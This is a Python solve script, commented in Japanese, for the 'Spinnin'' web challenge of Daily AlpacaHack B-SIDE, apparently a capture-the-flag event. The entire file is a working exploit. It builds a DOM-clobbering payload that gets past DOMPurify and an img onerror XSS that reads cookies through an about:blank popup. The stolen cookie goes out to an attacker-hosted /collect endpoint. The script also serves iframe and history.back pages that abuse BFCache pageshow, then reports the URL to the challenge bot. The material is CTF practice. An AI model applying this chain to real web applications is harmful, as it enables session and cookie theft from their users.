#!/usr/bin/env python3
"""Spinnin' (Daily AlpacaHack B-SIDE) の解法スクリプト。

Web アプリは、クエリパラメータ `content` を DOMPurify でサニタイズし、
`<textarea id="input">` の中へ埋め込む。ページの JavaScript は
`pageshow` のたびに `render()` を実行し、
`document.getElementById("input").value` を `#content` の `innerHTML` に
代入する。`#content` は textarea より文書順で前に現れるため、
`content` の中に `<input id="input" ...>` を仕込んでおくと、2 回目の
`render()` では攻撃者の input が `getElementById` に引っかかり、
その `value` 属性の中身（文字列として隠しておいた HTML）が
`innerHTML` として再パースされて XSS が発火する（DOM Clobbering）。

2 回目の `render()` は、攻撃者のページに iframe で埋め込んだうえで
トップページを遷移させて履歴を戻すことで起こす。BFCache から
ページが復元されると iframe 側でも `pageshow` が発火するため、
bot がボタンをクリックしなくても自動で発火させられる。

bot はフラグを `FLAG` Cookie（HttpOnly なし）として保持して
通報先 URL を訪問する。XSS のコードは `about:blank` のポップアップを
開いて Web アプリ側のオリジンで Cookie を読み、収集用エンドポイントへ
送信する。

使い方:
    python3 solve.py --bot-url http://localhost:1337 \
        --web-url http://web:3001 --public-base http://127.0.0.1:18080

    --bot-url     bot サービスのベース URL（/api/report に通報する）
    --web-url     Web アプリのベース URL（bot のブラウザから見えるもの）
    --public-base このスクリプトが立てるサーバーへ bot のブラウザから
                  アクセスするためのベース URL
"""

import argparse
import json
import re
import sys
import threading
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, quote, urlparse

# 受け取った Cookie 文字列からフラグ形式の部分を取り出すためのパターン。
FLAG_RE = re.compile(r"Alpaca\{[^}]*\}")


def build_web_url(web_base, collect_url):
    """攻撃用ペイロードを仕込んだ Web アプリの URL を組み立てる。

    ペイロードは `<input id="input" value="...">` という形で、
    value の中には img タグの文字列を隠しておく。onerror 属性の
    区切りには `&quot;` を使う。サニタイザはこれを属性値のテキストとして
    そのまま通し、ブラウザの 1 回目のパースでも文字列として保持される。
    2 回目のパースで初めて `&quot;` が引用符として機能し、
    img 要素の onerror ハンドラになる。
    """
    # XSS 本体: about:blank のポップアップを開き、その文書（Web アプリの
    # オリジンを継承し、トップレベルの文脈になる）から Cookie を読んで
    # 収集用エンドポイントへ画像リクエストとして送る。
    handler = (
        "const p=window.open('about:blank');"
        "if(p)new Image().src='"
        + collect_url
        + "?stage=xss&cookie='+encodeURIComponent(p.document.cookie)"
    )
    nested_image = f"<img src=x onerror=&quot;{handler}&quot;>"
    content = f'<input id=input value="{nested_image}">'
    return web_base.rstrip("/") + "/?content=" + quote(content, safe="")


def build_pages(web_url, public_base):
    """攻撃者側で配信する 3 つのルートの本文を組み立てる。

    /a       Web アプリを iframe で埋め込むページ。読み込み後に
             トップページを /a2 へ遷移させる。
    /a2      少し待ってから history.back() で履歴を戻すページ。
             /a が BFCache から復元され、iframe 内で pageshow が
             再び発火して 2 回目の render() が走る。
    /collect XSS が Cookie を送ってくる収集用エンドポイント。
    """
    base = public_base.rstrip("/")
    a_html = f"""<!doctype html>
<meta charset="utf-8">
<iframe src="{web_url}"></iframe>
<script>
addEventListener("load", () => {{
  setTimeout(() => location.href = "{base}/a2", 400);
}}, {{once: true}});
</script>"""
    a2_html = """<!doctype html><meta charset=utf-8><script>setTimeout(() => history.back(), 400)</script>"""
    return {"/a": a_html, "/a2": a2_html}


class ExploitServer(BaseHTTPRequestHandler):
    """攻撃ページの配信と Cookie の収集を行う小さな HTTP サーバー。"""

    pages = {}
    received_cookie = None
    done = threading.Event()

    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == "/collect":
            params = parse_qs(parsed.query)
            cookie = params.get("cookie", [None])[0]
            if cookie:
                ExploitServer.received_cookie = cookie
                ExploitServer.done.set()
            body = b"received"
            content_type = "text/plain; charset=utf-8"
        elif parsed.path in self.pages:
            body = self.pages[parsed.path].encode()
            content_type = "text/html; charset=utf-8"
        else:
            self.send_error(404)
            return
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):  # アクセスログは静かにする
        pass


def report_to_bot(bot_base, url):
    """bot の /api/report に URL を通報し、訪問させる。"""
    request = urllib.request.Request(
        bot_base.rstrip("/") + "/api/report",
        data=json.dumps({"url": url}).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    # bot 側の訪問（ページ読み込み + 待機）に時間がかかるため余裕を持つ。
    with urllib.request.urlopen(request, timeout=60) as response:
        return response.read().decode()


def main():
    parser = argparse.ArgumentParser(description="Spinnin' の解法スクリプト")
    parser.add_argument("--bot-url", required=True, help="bot サービスのベース URL")
    parser.add_argument("--web-url", required=True, help="Web アプリのベース URL")
    parser.add_argument(
        "--public-base",
        default=None,
        help="このスクリプトのサーバーへ bot からアクセスするためのベース URL",
    )
    parser.add_argument("--port", type=int, default=18080, help="待ち受けポート")
    parser.add_argument("--timeout", type=int, default=60, help="収集の待ち時間（秒）")
    args = parser.parse_args()

    public_base = args.public_base or f"http://127.0.0.1:{args.port}"
    collect_url = public_base.rstrip("/") + "/collect"
    web_url = build_web_url(args.web_url, collect_url)

    ExploitServer.pages = build_pages(web_url, public_base)
    server = ThreadingHTTPServer(("0.0.0.0", args.port), ExploitServer)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"listening on port {args.port}")

    try:
        report_url = public_base.rstrip("/") + "/a"
        print(f"reporting to bot: {report_url}")
        result = report_to_bot(args.bot_url, report_url)
        print(f"bot response: {result}")

        if not ExploitServer.done.wait(timeout=args.timeout):
            print("フラグを受け取れませんでした（タイムアウト）", file=sys.stderr)
            return 1
    finally:
        server.shutdown()

    cookie = ExploitServer.received_cookie or ""
    match = FLAG_RE.search(cookie)
    if not match:
        print(f"受け取った Cookie からフラグが見つかりません: {cookie!r}", file=sys.stderr)
        return 1

    print(f"Flag: {match.group(0)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
